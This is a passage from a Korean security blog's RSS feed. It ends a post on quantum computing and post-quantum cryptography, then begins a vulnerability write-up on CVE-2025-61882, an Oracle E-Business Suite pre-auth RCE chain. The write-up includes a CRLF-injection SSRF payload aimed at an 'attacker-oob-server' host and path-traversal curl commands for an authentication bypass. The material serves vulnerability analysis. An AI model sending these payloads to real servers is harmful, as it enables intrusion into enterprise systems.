&#xAD8C;&#xC7A5;</strong>&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB85C;&#xBC84; &#xACF5;&#xACA9;&#xC744; &#xAC10;&#xC548;&#xD558;&#xB354;&#xB77C;&#xB3C4; AES-256&#xC740; &#xC5EC;&#xC804;&#xD788; &#xCDA9;&#xBD84;&#xD788; &#xC548;&#xC804;&#xD558;&#xB2C8;&#xAE4C;&#xC694;.</p><h2 id="4-Q-day"><a href="#4-Q-day" class="headerlink" title="4. Q-day"></a>4. Q-day</h2><p>&#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xD604;&#xC7AC;&#xC758; &#xC554;&#xD638;&#xB97C; &#xC2E4;&#xC81C;&#xB85C; &#xD574;&#xB3C5;&#xD560; &#xC218; &#xC788;&#xB294; &#xB0A0;, <strong>Q-Day(Quantum Day)</strong> &#xAC00; &#xC5B8;&#xC81C; &#xC62C;&#xC9C0;&#xB294; &#xC544;&#xBB34;&#xB3C4; &#xC815;&#xD655;&#xD788; &#xC608;&#xCE21;&#xD560; &#xC218; &#xC5C6;&#xC5B4;&#xC694;. &#xD558;&#xC9C0;&#xBA74; &#xD604;&#xC7AC; &#xC6B0;&#xB9AC;&#xAC00; &#xC788;&#xB294; &#xB2E8;&#xACC4;&#xB294; NISQ(Noisy Intermediate-Scale Quantum) &#xC2DC;&#xB300;&#xC5D0;&#xC694;. </p><p>&#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xC7A1;&#xC74C;&#xC774; &#xB9CE;&#xC740; &#xC911;&#xAC04; &#xB2E8;&#xACC4;&#xC758; &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130; &#xC2DC;&#xB300;&#xC785;&#xB2C8;&#xB2E4;. &#xC804; &#xC138;&#xACC4; &#xC720;&#xC218; IT &#xAE30;&#xC5C5;&#xB4E4;&#xC740; &#xC218;&#xBC31; &#xAC1C;&#xC758; &#xD050;&#xBE44;&#xD2B8;&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xAE34; &#xD588;&#xC9C0;&#xB9CC;, &#xC5EC;&#xC804;&#xD788; &#xBD88;&#xC548;&#xC815;&#xD558;&#xACE0; &#xC624;&#xB958;&#xC728;&#xC774; &#xB192;&#xC544;&#xC11C; RSA&#xB97C; &#xAE68;&#xAE30;&#xC5D0;&#xB294; &#xBD80;&#xC871;&#xD55C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC694;. RSA-2048&#xC744; &#xC644;&#xC804;&#xD788; &#xAE68;&#xB824;&#xBA74; &#xC218;&#xCC9C;&#xB9CC; &#xAC1C; &#xC774;&#xC0C1;&#xC758; &#xC548;&#xC815;&#xC801;&#xC778; &#xB17C;&#xB9AC; &#xD050;&#xBE44;&#xD2B8;(logical qubit)&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xC54C;&#xB824;&#xC838; &#xC788;&#xC9C0;&#xB9CC; &#xC9C0;&#xAE08;&#xC758; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB294; &#xB300;&#xBD80;&#xBD84; &#xC218;&#xBC31; &#xAC1C; &#xC218;&#xC900;&#xC758; &#xBB3C;&#xB9AC; &#xD050;&#xBE44;&#xD2B8;(physical qubit)&#xB2E8;&#xACC4;&#xC5D0; &#xBA38;&#xBB3C;&#xB7EC; &#xC788;&#xAC70;&#xB4E0;&#xC694;.</p><p>&#xAC8C;&#xB2E4;&#xAC00; &#xBB3C;&#xB9AC; &#xD050;&#xBE44;&#xD2B8;&#xB97C; &#xC5EC;&#xB7EC; &#xAC1C; &#xBB36;&#xC5B4;&#xC11C; &#xD558;&#xB098;&#xC758; &#xB17C;&#xB9AC; &#xD050;&#xBE44;&#xD2B8;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xC624;&#xB958; &#xBCF4;&#xC815;(error correction) &#xAE30;&#xC220;&#xB3C4; &#xC544;&#xC9C1; &#xC5F0;&#xAD6C; &#xB2E8;&#xACC4;&#xC5D0; &#xBA38;&#xBB3C;&#xB7EC; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC9C0;&#xAE08;&#xC740; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xC548;&#xC815;&#xC801;&#xC73C;&#xB85C; &#xC791;&#xB3D9; &#xC2DC;&#xD0A4;&#xB294; &#xBC95;&#xC744; &#xBC30;&#xC6B0;&#xB294; &#xC2DC;&#xB300;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xADF8;&#xB7FC;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; Q-Day&#xAC00; <strong>&#xC5B8;&#xC820;&#xAC00; &#xBC18;&#xB4DC;&#xC2DC; &#xC628;&#xB2E4;</strong>&#xB294; &#xC810;&#xC5D0;&#xB294; &#xC774;&#xACAC;&#xC774; &#xC5C6;&#xC5B4;&#xC694;. &#xC774;&#xBBF8; &#xC815;&#xBD80;&#xC640; &#xC8FC;&#xC694; &#xAE30;&#xAD00;&#xB4E4;&#xC740; &#xADF8; &#xC2DC;&#xC810;&#xC744; &#xB300;&#xBE44;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC6C0;&#xC9C1;&#xC784;&#xC744; &#xC2DC;&#xC791;&#xD588;&#xAC70;&#xB4E0;&#xC694;. &#xBBF8;&#xAD6D; NIST(&#xAD6D;&#xB9BD;&#xD45C;&#xC900;&#xAE30;&#xC220;&#xC5F0;&#xAD6C;&#xC18C;)&#xB294; <strong>&#xC591;&#xC790; &#xB0B4;&#xC131; &#xC554;&#xD638;(Post-Quantum Cryptography, PQC)</strong> &#xD45C;&#xC900;&#xD654;&#xB97C; &#xCD94;&#xC9C4;&#xD558;&#xACE0;, 2024&#xB144;&#xC5D0; 1&#xCC28; &#xD45C;&#xC900; &#xD6C4;&#xBCF4;&#xAD70;&#xC744; &#xD655;&#xC815;&#xD588;&#xC5B4;&#xC694;. &#xC720;&#xB7FD;&#xC5F0;&#xD569;&#xACFC; &#xD55C;&#xAD6D;&#xC758; KISA, &#xC77C;&#xBCF8;&#xC758; NICT &#xB4F1;&#xB3C4; &#xC774;&#xC5D0; &#xB300;&#xBE44;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/12/bekim/quantum_computer/ko/image4.png" alt></p><blockquote><p>Source: IMARC Group</p></blockquote><p>&#xC774;&#xCC98;&#xB7FC; &#xAC01;&#xAD6D; &#xC815;&#xBD80;&#xC640; &#xAE30;&#xC5C5;&#xC774; &#xC591;&#xC790; &#xC704;&#xD611;&#xC5D0; &#xB300;&#xBE44;&#xD558;&#xBA74;&#xC11C;, &#xC591;&#xC790; &#xB0B4;&#xC131; &#xC554;&#xD638;<strong>(PQC)</strong>&#xC2DC;&#xC7A5;&#xB3C4; &#xD3ED;&#xBC1C;&#xC801;&#xC73C;&#xB85C; &#xC131;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. IMARC Group&#xC5D0; &#xB530;&#xB974;&#xBA74; PQC &#xC2DC;&#xC7A5;&#xC740; 2024&#xB144; &#xC57D; 3&#xC5B5; &#xB2EC;&#xB7EC; &#xADDC;&#xBAA8;&#xC5D0;&#xC11C; 2033&#xB144;&#xC5D0;&#xB294; &#xC57D; 94&#xC5B5; &#xB2EC;&#xB7EC;&#xAE4C;&#xC9C0; &#xC131;&#xC7A5;&#xD560; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xCE21;&#xB3FC;&#xC694;. </p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xCD5C;&#xB300;&#xD55C; &#xC27D;&#xAC8C;, &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xC640; &#xC554;&#xD638;&#xC758; &#xAD00;&#xACC4;&#xB97C; &#xC815;&#xB9AC;&#xD574;&#xBD24;&#xC5B4;&#xC694;. &#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; &#xC591;&#xC790; &#xB0B4;&#xC131; &#xC554;&#xD638;(PQC)&#xC5D0; &#xBB50;&#xAC00; &#xC788;&#xB294;&#xC9C0;, &#xC65C; &#x201C;&#xD3EC;&#xC2A4;&#xD2B8; &#xC591;&#xC790; &#xC2DC;&#xB300;&#x201D;&#xC758; &#xD575;&#xC2EC; &#xAE30;&#xC220;&#xB85C; &#xBD88;&#xB9AC;&#xB294;&#xC9C0; &#xD568;&#xAED8; &#xC54C;&#xC544;&#xBCFC;&#xAC8C;&#xC694;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/crypto/">crypto</category>
      
      <category domain="https://hackyboiz.github.io/tags/quantum/">quantum</category>
      
      <category domain="https://hackyboiz.github.io/tags/quantumcomputing/">quantumcomputing</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-61882: Oracle E-Business Suite에서 발생한 연쇄 취약점으로 인한 RCE (CRLF Injection 등)</title>
      <link>https://hackyboiz.github.io/2025/10/11/banda/CVE-2025-61882/</link>
      <guid>https://hackyboiz.github.io/2025/10/11/banda/CVE-2025-61882/</guid>
      <pubDate>Sat, 11 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.oracle.com/security-alerts/alert-cve-20</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.oracle.com/security-alerts/alert-cve-2025-61882.html">https://www.oracle.com/security-alerts/alert-cve-2025-61882.html</a></li><li><a href="https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882/">https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Oracle E-Business Suite 12.2.3-12.2.14</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-61882&#xB294; Oracle E-Business Suite(EBS)&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC73C;&#xBA70;, &#xB2E8;&#xC77C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC544;&#xB2CC; &#xC5F0;&#xC1C4; &#xCDE8;&#xC57D;&#xC810; &#xAE30;&#xBC18; Pre-Auth RCE Chain&#xC785;&#xB2C8;&#xB2E4;. Oracle EBS&#xB294; &#xAE30;&#xC5C5;&#xC6A9; &#xD1B5;&#xD569; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xBAA8;&#xC74C; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xC601;&#xD5A5; &#xBC94;&#xC704;&#xAC00; &#xD06C;&#xBA70;, &#xACF5;&#xACA9;&#xC5D0;&#xB294; &#xB2E4;&#xC74C; &#xAE30;&#xBC95;&#xACFC; &#xD750;&#xB984;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>URL-encoded XML injection &#x2192; SSRF</li><li>CRLF injection</li><li>Auth bypass</li><li>HTTP request smuggling(keep-alive smuggling)</li><li>OOB XSL / XSLT &#xB85C;&#xB4DC;</li><li>XSLT Java &#xD655;&#xC7A5; / ScriptEngine &#xC545;&#xC6A9;</li></ul><h3 id="1-URL-encoded-XML-&#x2192;-Server-Side-Request-Forgery-SSRF"><a href="#1-URL-encoded-XML-&#x2192;-Server-Side-Request-Forgery-SSRF" class="headerlink" title="1. URL-encoded XML &#x2192; Server-Side Request Forgery (SSRF)"></a>1. URL-encoded XML &#x2192; Server-Side Request Forgery (SSRF)</h3><pre><code class="hljs java"><span class="hljs-keyword">if</span> (paramHttpServletRequest.getParameter(<span class="hljs-string">&quot;getUiType&quot;</span>) != <span class="hljs-keyword">null</span>) {  String str = paramHttpServletRequest.getParameter(<span class="hljs-string">&quot;redirectFromJsp&quot;</span>); <span class="hljs-comment">// [1]</span>  XMLDocument xMLDocument = XmlUtil.parseXmlString(paramHttpServletRequest.getParameter(<span class="hljs-string">&quot;getUiType&quot;</span>)); <span class="hljs-comment">// [0]</span>  <span class="hljs-keyword">if</span> (str == <span class="hljs-keyword">null</span> || <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(str)) {    redirectToCZInitialize(...);    <span class="hljs-keyword">return</span>;  }  createNew(xMLDocument, httpSession, paramHttpServletRequest, paramHttpServletResponse); <span class="hljs-comment">// [2]</span>}</code></pre><p>&#xBA3C;&#xC800; &#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC131;&#xC740; URL-encoded XML &#xC785;&#xB825; &#xC8FC;&#xC785;&#xC744; &#xD1B5;&#xD574; SSRF&#xAC00; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xBA70;, &#xC774;&#xB294; servlet &#xC9C4;&#xC785;&#xBD80;&#xC758; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><code>[0]</code>: <code>getUiType</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0;&#xC11C; XML &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC9C1;&#xC811; &#xD30C;&#xC2F1;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>[1]</code>: <code>redirectFromJsp</code>&#xAC00; null&#xC774; &#xC544;&#xB2D0; &#xB54C; <code>createNew()</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>[2]</code>: <code>createNew()</code>&#xAC00; &#xC774;&#xD6C4; XML &#xB0B4;&#xC6A9;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; <code>return_url</code>&#xC744; &#xCD94;&#xCD9C;&#xD574; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">postXmlMessage</span><span class="hljs-params">(String paramString1, String paramString2)</span> <span class="hljs-keyword">throws</span> ServletException </span>{  URL uRL = getUrl(paramString1);  <span class="hljs-keyword">if</span> (uRL != <span class="hljs-keyword">null</span>)    paramString1 = uRL.toExternalForm();  CZURLConnection cZURLConnection = <span class="hljs-keyword">new</span> CZURLConnection(paramString1);  String[] arrayOfString1 = { <span class="hljs-string">&quot;XMLmsg&quot;</span> };  String[] arrayOfString2 = { paramString2 };  cZURLConnection.connect(<span class="hljs-number">1</span>, arrayOfString1, arrayOfString2);  cZURLConnection.close();}</code></pre><p><code>postXmlMessage()</code>&#xB294; <code>return_url</code>&#xB85C; <code>CZURLConnection</code>&#xC744; &#xB9CC;&#xB4E0; &#xB4A4; <code>cZURLConnection.connect(...)</code>&#xC5D0;&#xC11C; <code>URL.openConnection()</code>&#x2192;<code>HttpURLConnection</code>&#xC744; &#xC124;&#xC815;&#xD558;&#xACE0; <code>getOutputStream()</code> &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C; TCP &#xC5F0;&#xACB0;&#xC744; &#xB9FA;&#xC5B4; POST&#xB97C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAC80;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; <code>return_url</code> &#xC774; &#xACF5;&#xACA9;&#xC790; &#xC81C;&#xC5B4; &#xC8FC;&#xC18C;&#xB77C;&#xBA74;, &#xC11C;&#xBC84;&#xAC00; &#xADF8; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC9C1;&#xC811; &#xC544;&#xC6C3;&#xBC14;&#xC6B4;&#xB4DC; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xAC8C; &#xB418;&#xC5B4; SSRF&#xAC00; &#xC131;&#xB9BD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">connect</span><span class="hljs-params">(URL paramURL, String paramString)</span> <span class="hljs-keyword">throws</span> IOException </span>{  HttpURLConnection httpURLConnection = (HttpURLConnection)paramURL.openConnection();  updateDefaultHeaders(httpURLConnection, ...);  httpURLConnection.setDoOutput(<span class="hljs-keyword">true</span>);  httpURLConnection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);  <span class="hljs-keyword">this</span>.m_connectionOutputStream = httpURLConnection.getOutputStream();  postMessage(paramString, httpURLConnection);}</code></pre><p>&#xB610;&#xD55C; <code>connect()</code> &#xD568;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>openConnection()</code>&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB41C; &#xC5F0;&#xACB0;&#xC774; &#xAC80;&#xC99D;&#xC5C6;&#xC774; &#xACE7;&#xBC14;&#xB85C; POST&#xB97C; &#xC218;&#xD589;&#xD558;&#xBBC0;&#xB85C;, &#xBCC4;&#xB2E4;&#xB978; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xB294; &#xC0C1;&#xD0DC;&#xB85C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD638;&#xCD9C;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="2-CRLF-Injection"><a href="#2-CRLF-Injection" class="headerlink" title="2. CRLF Injection"></a>2. CRLF Injection</h3><p>PoC&#xC5D0; <code>return_url</code>&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; <code>&amp;#13;&amp;#10;</code>, <code>%0d%0a</code>&#xC640; &#xAC19;&#xC740; CRLF&#xAC00; &#xB514;&#xCF54;&#xB4DC;&#xB418;&#xC5B4; &#xC2E4;&#xC81C; &#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xC18C;&#xCF13;&#xC5D0; &#xC4F0;&#xC774;&#xBA74;, &#xC11C;&#xBC84;&#xAC00; &#xC804;&#xC1A1;&#xD558;&#xB294; HTTP &#xC694;&#xCCAD;&#xC758; &#xB77C;&#xC778;/&#xD5E4;&#xB354; &#xACBD;&#xACC4;&#xB97C; &#xC870;&#xC791;&#xD574; &#xC784;&#xC758;&#xC758; &#xD5E4;&#xB354; &#xBE14;&#xB85D;&#xC774;&#xB098; &#xCD94;&#xAC00; &#xC694;&#xCCAD; &#xB77C;&#xC778;&#xC744; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs html">redirectFromJsp=1&amp;getUiType=<span class="hljs-tag">&lt;<span class="hljs-name">@urlencode</span>&gt;</span><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">initialize</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;init_was_saved&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;return_url&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">http:</span>//<span class="hljs-attr">attacker-oob-server</span>&gt;</span><span class="hljs-symbol">&amp;#47;</span>HeaderInjectionTest<span class="hljs-symbol">&amp;#32;</span>HTTP<span class="hljs-symbol">&amp;#47;</span>1<span class="hljs-symbol">&amp;#46;</span>1<span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span>InjectedHeader<span class="hljs-symbol">&amp;#58;</span>Injected<span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span><span class="hljs-symbol">&amp;#32;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span>POST<span class="hljs-symbol">&amp;#32;</span><span class="hljs-symbol">&amp;#47;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ui_def_id&quot;</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;config_effective_usage_id&quot;</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ui_type&quot;</span>&gt;</span>Applet<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">initialize</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">@urlencode</span>&gt;</span></code></pre><p>&#xC989;, SSRF&#xB97C; &#xD1B5;&#xD574; &#xC694;&#xCCAD; &#xBC14;&#xB514;&#xC758; <code>getUiType</code>&#xC5D0; URL-encoded XML&#xC744; &#xBCF4;&#xB0B4;&#xACE0;, &#xADF8; &#xC548;&#xC758; <code>return_url</code>&#xC5D0; <code>\r\n</code>(CRLF)&#xACFC; <code>POST /</code>&#xC640; &#xAC19;&#xC740; &#xCD94;&#xAC00; &#xD5E4;&#xB354; &#xB77C;&#xC778;&#xC744; &#xB07C;&#xC6CC; &#xB123;&#xC73C;&#xBA74;, &#xC218;&#xC2E0; &#xCE21;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xCC98;&#xB7FC; **&#xC8FC;&#xC785;&#xB41C; &#xC694;&#xCCAD; &#xB77C;&#xC778;/&#xD5E4;&#xB354;&#xAC00; &#xAD00;&#xCC30;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml">POST /HeaderInjectionTest HTTP/1.1--- HEADERS ---InjectedHeader: Injected</code></pre><h3 id="3-HTTP-persistent-connection-keep-alive"><a href="#3-HTTP-persistent-connection-keep-alive" class="headerlink" title="3. HTTP persistent connection(keep-alive)"></a>3. HTTP persistent connection(keep-alive)</h3><p><img src="/2025/10/11/banda/CVE-2025-61882/image1.png" alt></p><p>&#xC774;&#xD6C4; &#xB450; &#xBC88;&#xC9F8; &#xB2E8;&#xACC4;(CRLF injection)&#xB294; &#xC138; &#xBC88;&#xC9F8; &#xB2E8;&#xACC4;&#xC778; HTTP keep-alive &#xC545;&#xC6A9;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong><em>keep-alive</em></strong><br>HTTP/1.1&#xC5D0;&#xC11C; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xB3D9;&#xC791;&#xC73C;&#xB85C;, &#xD558;&#xB098;&#xC758; TCP &#xC5F0;&#xACB0;&#xC744; &#xB2EB;&#xC9C0; &#xC54A;&#xACE0; &#xC5EC;&#xB7EC; &#xC694;&#xCCAD;/&#xC751;&#xB2F5;&#xC744; &#xC5F0;&#xC18D; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574; &#xC90D;&#xB2C8;&#xB2E4;. (&#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; <code>Connection: close</code>&#xAC00; &#xC544;&#xB2CC; &#xD55C; &#xC9C0;&#xC18D;)</p></blockquote><p>&#xC989;, SSRF&#xB97C; &#xD1B5;&#xD574; &#xC694;&#xCCAD; &#xACBD;&#xACC4;&#xB97C; &#xC870;&#xC791;&#xD55C; &#xB4A4;, &#xB3D9;&#xC77C;&#xD55C; TCP &#xC5F0;&#xACB0;&#xC744; keep-alive&#xB85C; &#xC7AC;&#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD6C4;&#xC18D; &#xC694;&#xCCAD;&#xC744; &#xAC19;&#xC740; &#xC5F0;&#xACB0;&#xC5D0;&#xC11C; &#xC5F0;&#xC18D; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xD0D0;&#xC9C0; &#xB178;&#xC774;&#xC988;&#xB97C; &#xC904;&#xC774;&#xBA74;&#xC11C; &#xD6C4;&#xC18D; &#xC694;&#xCCAD;&#xC774; <code>localhost:7201</code>&#xACFC; &#xAC19;&#xC740; &#xB0B4;&#xBD80; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="4-Auth-Bypass"><a href="#4-Auth-Bypass" class="headerlink" title="4. Auth Bypass"></a>4. Auth Bypass</h3><pre><code class="hljs xml"># netstat -lnttcp6       0      0 172.31.28.161:7201      :::*                    LISTEN# cat /etc/hosts172.31.28.161   apps.example.com        apps#</code></pre><p>Oracle EBS &#xB0B4;&#xBD80; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xD575;&#xC2EC; HTTP &#xC11C;&#xBE44;&#xC2A4;&#xB294; 172.31.28.161:7201&#xCC98;&#xB7FC; &#xC0AC;&#xC124; IP&#xC5D0; &#xBC14;&#xC778;&#xB529;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xD615;&#xD0DC;&#xC778;&#xB370;, &#xC774;&#xB54C; <code>/etc/hosts</code> &#xD30C;&#xC77C; &#xC548;&#xC5D0; <code>apps.example.com</code> &#xB9E4;&#xD551;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB54C;&#xBB38;&#xC5D0; &#xC11C;&#xBC84; &#xCE21; &#xAD00;&#xC810;(SSRF/&#xC2A4;&#xBA38;&#xAE00;&#xB9C1;&#xC73C;&#xB85C; &#xC5F4;&#xC5B4;&#xB454; &#xC5F0;&#xACB0;)&#xC5D0;&#xC11C;&#xB294; <code>http://apps.example.com:7201</code> &#xC73C;&#xB85C; &#xB0B4;&#xBD80; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml"># curl -s http://apps.example.com:7201/OA_HTML/ieshostedsurvey.jsp# curl -s --path-as-is http://apps.example.com:7201/OA_HTML/help/../ieshostedsurvey.jsp</code></pre><p>&#xB610;&#xD55C; <code>/OA_HTML/help/</code>&#xB294; &#xC778;&#xC99D;&#xC774; &#xC694;&#xAD6C;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xACF5;&#xAC1C; &#xACBD;&#xB85C;&#xC774;&#xBBC0;&#xB85C;, <code>../</code>&#xC640; &#xAC19;&#xC740; &#xACBD;&#xB85C; &#xD6A1;&#xB2E8;&#xC744; &#xCD94;&#xAC00;&#xD574; <code>/OA_HTML/help/../ieshostedsurvey.jsp</code> &#xD615;&#xD0DC;&#xB85C; &#xD654;&#xC774;&#xD2B8;&#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC6B0;&#xD68C;&#xD574; &#xBCF4;&#xD638;&#xB41C; jsp&#xC778; <code>ieshostedsurvey.jsp</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="5-XSL-Transformation-XSLT"><a href="#5-XSL-Transformation-XSLT" class="headerlink" title="5. XSL Transformation (XSLT)"></a>5. XSL Transformation (XSLT)</h3><pre><code class="hljs java">&lt;html&gt;&lt;head&gt;..&lt;/head&gt;&lt;body &lt;%=_jtfPageContext.getHtmlBodyAttr() %&gt; <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&apos;applicationBody&apos;</span>&gt;..StringBuffer urlbuf = <span class="hljs-keyword">new</span> StringBuffer();urlbuf.append(<span 